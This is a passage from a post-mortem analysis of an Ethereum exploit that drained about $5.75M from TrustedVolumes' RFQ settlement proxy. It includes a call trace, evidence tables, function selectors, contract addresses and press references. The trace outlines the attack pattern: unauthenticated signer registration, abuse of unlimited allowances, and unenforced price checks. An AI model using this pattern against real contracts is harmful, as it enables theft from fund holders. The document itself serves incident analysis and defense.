│       ├─ Chainlink token/USD .latestRoundData() ← read, not enforced
│       ├─ token.transferFrom(RESOLVER → contract, big)        ← drain
│       ├─ USDC.transferFrom(contract → RESOLVER, 1)            ← "payment"
│       └─ emit RfqFilled(0x908e04b7…)
├─ WETH.withdraw(1291.16e18)                   ← unwrap
├─ ETH.send(EOA, 1291.16e18)
├─ USDT.transfer(EOA, 206282.45e6)
├─ WBTC.transfer(EOA, 16.94e8)
└─ USDC.transfer(EOA, 1268771.49e6)
```

### 8.4 Key Verification Points

| Claim | On-Chain Evidence |
|-------|-------------------|
| Anyone can call `registerAllowedOrderSigner` | EOA nonce was 0 entering the tx → no prior auth setup; the call succeeds inside the constructor itself with no admin context. |
| The attacker's EOA is the signer for all four orders | All four `ecrecover` calls in the trace return `0xC3EBDdEa…9100`. |
| Resolver had pre-approved unlimited allowance to the proxy | `WBTC.allowance(resolver, proxy) == 2^256 − 1` returned in the trace; same for USDC, USDT, WETH. |
| Each fill is settled via `transferFrom(resolver, …)` | Trace shows `transferFrom` from `0x9bA0CF15…Da31` to `0xd4d5db5E…1e95` for the maker side, and from `0xd4d5db5E…1e95` to `0x9bA0CF15…Da31` for the 1-wei taker side. |
| Chainlink feeds were read for both assets but not enforced | Trace shows `latestRoundData()` reads, but `transferFrom` is unconditional on the result; no revert path follows the price reads. |

### 8.5 Additional Selectors Observed in Bytecode

| Selector | Function | Where |
|----------|----------|-------|
| `0xea7faa61` | `registerAllowedOrderSigner(address,bool)` | RFQ Proxy `0xeEeEEe53…1756` |
| `0x4112e1c2` | RFQ fill (custom; not in 4byte/openchain) | RFQ Proxy `0xeEeEEe53…1756` |
| `0x095ea7b3` | `approve(address,uint256)` | attack contract internal |
| `0x23b872dd` | `transferFrom(address,address,uint256)` | attack contract internal |
| `0xa9059cbb` | `transfer(address,uint256)` | attack contract internal |
| `0x2e1a7d4d` | `withdraw(uint256)` (WETH unwrap) | attack contract internal |

---

## 9. Additional Information

- **Affected contracts**: only TrustedVolumes' settlement infrastructure — RFQ Proxy `0xeEeEEe53…1756` (impl `0x88eb2800…60d8`) and the resolvers that pre-approved it. 1inch's aggregation router, Fusion contracts, backend, and user-held funds are not implicated; 1inch issued a public statement distancing its core infrastructure from the bug.
- **Three exploiter wallets** were used across the broader campaign, with this transaction being the largest single component (~$5.75M of the ~$5.87M – $6.7M total).
- **Same operator** as the March 2025 1inch Fusion V1 resolver exploit, per Blockaid and CertiK attribution. Different bug, same victim class.
- **Mitigation status**: TrustedVolumes confirmed the exploit and announced it is in "constructive talks" with the attacker; 1inch's co-founder publicly called for safer lending/market-maker patterns following the incident.

| Contract | Address |
|----------|---------|
| RFQ Exchange Proxy | `0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756` |
| RFQ Exchange Implementation | `0x88eb28009351Fb414A5746F5d8CA91cdc02760d8` |
| TrustedVolumes Resolver | `0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31` |
| Attacker EOA | `0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100` |
| Attack contract (deployed by this tx) | `0xd4d5db5EC65272B26F756712247281515F211e95` |
| WETH | `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2` |
| USDC | `0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48` |
| USDT | `0xdAC17F958D2ee523a2206206994597C13D831ec7` |
| WBTC | `0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599` |

---

## References

- Phalcon Explorer: [tx 0xc5c61b3a…0513](https://app.blocksec.com/phalcon/explorer/tx/eth/0xc5c61b3ac39d854773b9dc34bd0cdbc8b5bbf75f18551802a0b5881fcb990513)
- Etherscan: [tx](https://etherscan.io/tx/0xc5c61b3ac39d854773b9dc34bd0cdbc8b5bbf75f18551802a0b5881fcb990513) · [RFQ Exchange Proxy](https://etherscan.io/address/0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756) · [Resolver](https://etherscan.io/address/0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31) · [attacker EOA](https://etherscan.io/address/0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100) · [attack contract](https://etherscan.io/address/0xd4d5db5ec65272b26f756712247281515f211e95)
- Press: [Bankless Times — 1inch Market Maker Hit](https://www.banklesstimes.com/articles/2026/05/07/1inch-market-maker-hit-by-active-exploit-6m-drained-so-far/) · [CoinPaper — 1inch Distances Itself From $6.7M TrustedVolumes Exploit](https://coinpaper.com/16883/1inch-distances-itself-from-6-7-m-trusted-volumes-exploit) · [CryIP — TrustedVolumes Exploited for $5.87M](https://cryip.co/trustedvolumes-exploited-5-87-million-1inch-resolver-same-attacker/) · [Crypto-Economy — TrustedVolumes Confirms $6.7M Exploit](https://crypto-economy.com/trustedvolumes-confirms-6-7m-exploit-with-stolen-funds-spread-across-three-ethereum-wallets/) · [crypto.news — 1inch co-founder pushes safer lending](https://crypto.news/trustedvolumes-loses-nearly-6m-in-fresh-1inch-linked-exploit/) · [AMBCrypto — Blockaid detects $5.87M exploit](https://ambcrypto.com/blockaid-detects-5-87mln-trustedvolumes-exploit-heres-what-happened/)
